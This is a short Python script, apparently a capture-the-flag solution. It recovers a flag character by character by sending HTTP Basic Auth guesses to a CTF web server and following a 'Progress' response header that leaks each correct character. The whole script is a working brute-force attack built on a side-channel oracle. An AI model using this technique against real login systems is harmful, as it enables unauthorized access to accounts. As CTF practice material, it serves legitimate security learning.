import requests
from requests.auth import HTTPBasicAuth
from string import printable

printable = '_' + printable

flag = 'pctf{but_does_it_'

#  code to brute force, following anything that upticks progress
r = requests.get('http://web.ctf.b01lers.com:1005/', auth=HTTPBasicAuth('N Gonzalez', flag))
p = r.headers['Progress']

while flag[-1:] != '}':
    for c in printable:
        r = requests.get('http://web.ctf.b01lers.com:1005/', auth=HTTPBasicAuth('N Gonzalez', flag+c))
        new_p = r.headers['Progress']

        print(flag+c)
        print(new_p)

        if new_p > p:
            p = new_p
            flag += c
            break

print("p: {}".format(p))
print(flag)

